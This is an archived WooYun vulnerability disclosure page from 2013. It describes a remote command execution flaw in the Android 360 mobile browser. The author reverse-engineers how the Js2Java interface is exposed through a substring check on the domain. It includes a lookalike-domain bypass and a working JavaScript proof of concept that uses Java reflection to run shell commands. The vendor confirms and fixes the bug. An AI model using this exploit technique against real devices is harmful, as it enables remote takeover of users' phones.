@@ -1,0 +1,367 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360手机浏览器安卓版远程命令执行漏洞（可远程控制用户手机和挂马）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360手机浏览器安卓版远程命令执行漏洞（可远程控制用户手机和挂马）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/只抽红梅">只抽红梅</a> 
+</li><li>提交时间：		2013-09-06 11:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-09：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-26：	细节向普通白帽子公开<br/>
+									2013-10-16：	细节向实习白帽子公开<br/>
+									2013-12-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">关键时刻，怎能少了 360，360 浏览器一样存在问题，同样预警！over！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">没错就是安卓的那个 webview 的远程代码执行漏洞。之所以到现在没人报是因为隐藏的稍微那么深一点，废话少说下面走起。<br />
+<br />
+1、用我们的方法测试下，访问含有下面代码的页面来让我们目测下：<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+for(w in window){<br />
+    document.write(w + &quot;&lt;br/&gt;&quot;);<br />
+}<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+上面代码是遍历所有的 window 对象，经过目测都是系统对象，并没有看到 360 浏览器有通过 addJavascriptInterface 公开方法出来。<br />
+<br />
+2、真的没有么？深入挖掘下看看呢。在官方下载 apk 文件，反编译（过程略）。通过 jd-gui 在反编译后带的代码中搜索 addJavascriptInterface 关键字，找到了如下的代码：<br />
+<br />
+</p><pre><code>public static void addJavascriptInterface(ace paramace)<br />
+  {<br />
+    if ((paramace == null) || (!a(paramace)));<br />
+    while (true)<br />
+    {<br />
+      return;<br />
+      try<br />
+      {<br />
+        paramace.addJavascriptInterface(new aho(), &quot;Js2Java&quot;);<br />
+      }<br />
+      catch (Exception localException)<br />
+      {<br />
+        localException.printStackTrace();<br />
+      }<br />
+    }<br />
+  }</code></pre><p class='detail'><br />
+<br />
+看代码公开 Js2Java 方法是需要一定条件才能够触发的，那我们就来找到触发的条件。<br />
+<br />
+由于 jar 反编译成 java 代码并不是原生的 java 代码并且逻辑上也比较奇怪，所以我们就大致来判断吧，看下面：<br />
+<br />
+if ((paramace == null) || (!a(paramace)));<br />
+<br />
+这对 paramace 进行是空以及通过 a 函数来判断，随后才会进入到 addJavascriptInterface 流程。<br />
+<br />
+我们继续跟进 a 函数：<br />
+<br />
+</p><pre><code>private static boolean a(ace paramace)<br />
+  {<br />
+    boolean bool = false;<br />
+    String str1 = paramace.getUrl();<br />
+    int j;<br />
+    if (!avf.a(str1))<br />
+    {<br />
+      String str2 = Uri.parse(str1).getHost();<br />
+      String[] arrayOfString = a;<br />
+      int i = arrayOfString.length;<br />
+      j = 0;<br />
+      if (j &lt; i)<br />
+        if (str2.contains(arrayOfString[j]))<br />
+        {<br />
+          bhr.c(&quot;JSInterfaceHandler&quot;, &quot;this url CAN add javascript interface url = &quot; + str1);<br />
+          bool = true;<br />
+        }<br />
+    }<br />
+    while (true)<br />
+    {<br />
+      return bool;<br />
+      j++;<br />
+      break;<br />
+      bhr.c(&quot;JSInterfaceHandler&quot;, &quot;this url CANOT add javascript interface url = &quot; + str1);<br />
+    }<br />
+  }</code></pre><p class='detail'><br />
+<br />
+通过这段代码我们就又能够了解更多的信息，关键代码为：<br />
+<br />
+</p><pre><code>if (str2.contains(arrayOfString[j]))<br />
+        {<br />
+          bhr.c(&quot;JSInterfaceHandler&quot;, &quot;this url CAN add javascript interface url = &quot; + str1);<br />
+          bool = true;<br />
+        }</code></pre><p class='detail'><br />
+<br />
+通过判断 str2 这个字符串是否包含 arrayOfString[j]) 来决定是否公开 Js2Java 方法。str2 通过代码可以看到是当前 url 的 host 值。arrayOfString[j]) 呢？我们在上面的代码中又找到了：<br />
+<br />
+</p><pre><code>static<br />
+  {<br />
+    String[] arrayOfString = new String[1];<br />
+    arrayOfString[0] = &quot;yunpan.360.cn&quot;;<br />
+  }</code></pre><p class='detail'><br />
+<br />
+到这里我们有个大致清晰的思路就是，如果当前访问的页面域名为 yunpan.360.cn，我们就能够通过 JavaScript 来调用 Js2Java 方法。<br />
+<br />
+3、我最先想到的就是通过修改手机上 hosts 文件把 yunpan.360.cn 这个域名指向我们自己的服务器来判断我们的判断是否正确。修改后直接访问含有上面那段列出 window 对象的代码页面。发现没有 Js2Java，诡异，难道我们的判断出现错误了么（这里其实是一个坑，下面会提到）？<br />
+<br />
+4、有点不甘心啊，会过去看代码，我们看到一个地方：<br />
+<br />
+bhr.c(&quot;JSInterfaceHandler&quot;, &quot;this url CAN add javascript interface url = &quot; + str1);<br />
+<br />
+这里看起来像是调试日志，然后我们把手机连接上电脑，通过 adb logcat 来看是否有日志打印出来。分别访问 yunpan.360.cn 和 www.baidu.com 域名，发现没有任何日志打印出来。<br />
+<br />
+5、我…，打住，淡定点。缕一下。没有日志输出是不是会有类似于一个开关的呢，毕竟 360 的开发人员也是专业的么，好既然是通过 bhr.c 来输出的日志，我们就跟过去看看：<br />
+<br />
+</p><pre><code>public static int c(String paramString1, String paramString2)<br />
+  {<br />
+    if ((!a) || (paramString2 == null));<br />
+    for (int i = 0; ; i = Log.e(paramString1, paramString2))<br />
+      return i;<br />
+  }</code></pre><p class='detail'><br />
+<br />
+从上面看的确是通过 Log.e 来打印的日志，但是有个逻辑就是 a 变量，在前面我们找到了：<br />
+<br />
+public static boolean a = avc.a;<br />
+<br />
+a 是一个布尔值，是由 avc.a 来控制的，跟进去：<br />
+<br />
+public static boolean a = false;<br />
+<br />
+看到这里是 false ，果然，如果能够改为 true 就应该能够打印出日志的。<br />
+<br />
+6、既然前方有曙光，我们就不要停止脚步。之前我们通过烦编辑 apk 得到源代码了。既然是在 avc 这个文件里面定义的，我们就找到之前反编译得到的 avc.smali 文件，找到如下的代码：<br />
+<br />
+</p><pre><code>const/4 v2, 0x0<br />
+<br />
+    #v2=(One);<br />
+    sput-boolean v2, Lavc;-&gt;a:Z<br />
+<br />
+    sput-boolean v2, Lavc;-&gt;b:Z<br />
+<br />
+    sput-boolean v2, Lavc;-&gt;e:Z</code></pre><p class='detail'><br />
+<br />
+这里是定义 a 变量的值，我们修改为：<br />
+<br />
+</p><pre><code>const/4 v2, 0x1<br />
+<br />
+    #v2=(One);<br />
+    sput-boolean v2, Lavc;-&gt;a:Z<br />
+	<br />
+	const/4 v2, 0x0<br />
+<br />
+    sput-boolean v2, Lavc;-&gt;b:Z<br />
+<br />
+    sput-boolean v2, Lavc;-&gt;e:Z</code></pre><p class='detail'><br />
+<br />
+把 a 的值改为 1，其他保持不变。重新打包，签名，再次安装。<br />
+<br />
+然后在电脑端的终端中输入：adb logcat | grep JSInterfaceHandler 来过滤日志输出，这个时候手机访问 yunpan.360.cn 和 www.baidu.com 就可以看到日志了：<br />
+<br />
+</p><pre><code>xxx@xxx:~ $ adb logcat | grep JSInterfaceHandler<br />
+E/JSInterfaceHandler(23409): this url CANOT add javascript interface url = http://www.baidu.com/<br />
+E/JSInterfaceHandler(23409): this url CAN add javascript interface url = http://yunpan.360.cn/?qtrad=1</code></pre><p class='detail'><br />
+<br />
+再次证明之前我们的判断是正确的，但是问题出在哪里呢？<br />
+<br />
+7、这样的话我们就需要一个 yunpan.360.cn 域下的 xss，xss，xss，xss，好烦啊，可我还是去找了会，突然，别激动，不是找到 xss 了，而是我们忽略了之前一个问题。就是这里：<br />
+<br />
+str2.contains(arrayOfString[j])<br />
+<br />
+这里只是一个包含的关系，并不是等于的关系，那么你懂了么？只要我们的域名中含有 yunpan.360.cn 就可以绕过这个逻辑了，哈哈哈哈哈哈哈哈哈哈哈。<br />
+<br />
+我们吧 yunpan.360.cn.hongmei.me 解析到我们的服务器上面，访问。<br />
+<br />
+纳尼，没有任何日志输出。我…。<br />
+<br />
+8、淡定，肯定是有哪里不对，我直接把 yunpan.360.cn 首页下载到服务器上面，再次访问，哈哈，有了。看来是会判断页面中的元素了，这就是前面提到的坑，最开始我们的代码只有一个 script 标签。下面是日志：<br />
+<br />
+E/JSInterfaceHandler(23409): this url CAN add javascript interface url = http://yunpan.360.cn.hongmei.me/360_poc.html<br />
+<br />
+多么美好的一句话啊，从来没有对英文这么有好感过。<br />
+<br />
+9、既然，那么。好吧下面就是我们最终的 POC：<br />
+<br />
+</p><pre><code>&lt;!DOCTYPE html&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta charset=&quot;utf-8&quot;&gt;<br />
+<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+if(window.Js2Java){<br />
+    try{<br />
+        Js2Java.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec([&quot;/system/bin/sh&quot;,&quot;-c&quot;,&quot;echo &#039;360 mobile browser for android remote command execute&#039; &gt; /sdcard/360.txt&quot;]);<br />
+        alert(&#039;good job&#039;);<br />
+    }catch(e){<br />
+        alert(e);<br />
+    }<br />
+}<br />
+&lt;/script&gt;<br />
+<br />
+&lt;title&gt;360 mobile browser remote command execute poc&lt;/title&gt;<br />
+<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+10、再次访问我们的 POC 链接：<br />
+<br />
+http://yunpan.360.cn.hongmei.me/360_poc.html<br />
+<br />
+然后就去看执行的效果吧。<br />
+<br />
+</p><p class="detail"><a href="../images/06105608373cc902cfdc30fd0ee740cfc8dde97f.png" target="_blank"><img src="../images/06105608373cc902cfdc30fd0ee740cfc8dde97f.png" alt="360_1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0610561528591e12ebfb53991f0c0220040a15ab.png" target="_blank"><img src="../images/0610561528591e12ebfb53991f0c0220040a15ab.png" alt="360_2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/06105625774c62692334528b6a58b78392aaebfe.png" target="_blank"><img src="../images/06105625774c62692334528b6a58b78392aaebfe.png" alt="360_3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/06105608373cc902cfdc30fd0ee740cfc8dde97f.png" target="_blank"><img src="../images/06105608373cc902cfdc30fd0ee740cfc8dde97f.png" alt="360_1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0610561528591e12ebfb53991f0c0220040a15ab.png" target="_blank"><img src="../images/0610561528591e12ebfb53991f0c0220040a15ab.png" alt="360_2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/06105625774c62692334528b6a58b78392aaebfe.png" target="_blank"><img src="../images/06105625774c62692334528b6a58b78392aaebfe.png" alt="360_3.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、可以考虑严格的过滤方案吧。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/只抽红梅" title="只抽红梅">只抽红梅</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036253" title="360手机浏览器安卓版远程命令执行漏洞（可远程控制用户手机和挂马）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-09-06 13:12</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">针对WebView中的接口安全问题，之前360手机浏览器已经做了防护措施。感谢乌云白帽子反馈，帮助我们找到了一处防护缺陷，现已推出新版修复，欢迎继续关注测试。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36253";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
